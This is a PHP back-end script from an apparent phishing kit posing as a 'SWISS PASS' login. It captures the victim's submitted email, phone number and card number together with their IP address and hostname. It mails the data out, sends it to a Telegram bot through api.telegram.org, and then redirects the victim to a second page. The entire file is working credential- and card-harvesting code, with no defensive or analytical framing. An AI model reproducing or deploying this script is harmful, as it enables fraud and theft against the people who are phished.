<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "-------- SWISS PASS ---------\n";
$message .= "ACC          : ".$_POST['email']."\n";
$message .= "PVS          : ".$_POST['phone']."\n";
$message .= "----------- Z3CI ------------\n";
$message .= "lp      : $ip\n";
$message .= "H0ST    : $hostname\n";
$send = "";
$subject = "Login| ".$_POST['cardnumber']." | $ip ";
$headers = "From:Z3CI <ana@vps767524.ovh.net>";
mail($MyEmail,$subject,$message);
include 'configuration.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: 2.html?id=4932YR-329TR23R");

?>